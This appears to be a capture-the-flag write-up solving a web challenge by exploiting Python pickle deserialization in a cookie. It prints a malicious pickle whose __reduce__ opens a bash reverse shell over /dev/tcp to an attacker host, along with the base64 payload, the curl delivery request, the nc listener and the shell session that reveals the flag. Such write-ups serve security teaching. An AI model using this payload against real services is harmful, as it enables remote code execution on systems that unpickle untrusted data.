# Bonus Web x

Visit the site at hxxps://xxxxxxxx and find a way to get the flag.

There's a variable called 'flag' but good luck getting to it! This is a super serious challenge.

## Solution

After a few tries you will understand that the most interesting thing is in the cookie that displays your name `Reload for your greeting...`.

For me it was `KGRwMApWbmFtZQpwMQpWbmljb2xhcwpwMgpzLg==` which is the base64 encoded of

```
(dp0
Vname
p1
Vnicolas
p2
s.
```

If you don't recognize the Pickle encoding yet, you can play around with the API and an obvious error message will tell you that the "Pickle cannot be decoded".

Here it is a dictionary object: `{'name':'nicolas'}`.

I coded a reverse shell to gain access to the instance:

```
$ python
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
>>> import os
>>> import pickle
>>> class Shell_code(object):
...     def __reduce__(self):
...           return (os.system,('/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/4444 0>&1',))
... 
>>> with open('datafile.bin', 'wb') as fh:  pickle.dump(Shell_code(), fh)
... 
>>> exit

$ cat datafile.bin | base64 -w0
gASVSQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC4vYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AveHgueHgueHgueHgvNDQ0NCAwPiYxlIWUUpQu

```

In the meantime, I started my public instance and listened on port 4444

```
$ nc -l -p 4444
```

When I'm ready I run the POST request and wait for the reverse shell to work.

```
curl -X POST 'https://xxxxxxxx/stag/wx01' -d '{"userdata": "gASVSQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC4vYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AveHgueHgueHgueHgvNDQ0NCAwPiYxlIWUUpQu"}'
```

Back to my C2, I can use my RCE.

```
# First try, I only had the time to do a "ls" before the timeout of 5 seconds
$ nc -l -p 4444
bash: no job control in this shell
bash-4.2$ ls
ls
lambda_function.py

# This time I will do a "cat lambda_function.py" really fast
$ nc -l -p 4444
bash: no job control in this shell
bash-4.2$ cat lambda_function.py
cat lambda_function.py
import json
import pickle
import base64
import subprocess

flag = "Flag: suPER_SeRiAL-bR0_02891"
# Solution is: Y19fYnVpbHRpbl9fCmV2YWwKKFZleGVjKCJ1c2VyWyduYW1lJ109ZmxhZyIpCnRSLg==

def handle(event):
```

Flag is `suPER_SeRiAL-bR0_02891`
